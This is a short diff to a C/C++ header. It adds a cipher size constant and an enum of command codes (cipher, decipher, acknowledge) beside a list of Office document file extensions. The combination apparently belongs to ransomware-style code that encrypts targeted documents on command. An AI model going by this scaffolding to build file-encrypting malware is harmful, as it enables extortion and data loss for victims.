@@ -34,3 +34,14 @@
 	".ppam", ".ppsx", ".ppsm", ".pps", ".pot", ".pptm", ".pptx", ".ppt",		\
 	".xltm", ".xltx", ".xlc", ".xlm", ".xlt", ".xlw", ".xlsb", ".xlsm", ".xlsx",\
 	".xls", ".dotx", ".dotm", ".dot", ".docm", ".docb", ".docx", ".doc"
+
+#define CIPHER_SIZE 16
+
+typedef uint16_t CommandCode;
+
+enum : CommandCode {
+	NONE = 0x00,
+    CMD_CIPHER = 0x01,
+    CMD_DECIPHER = 0x02,
+	ACK = 0x03
+};
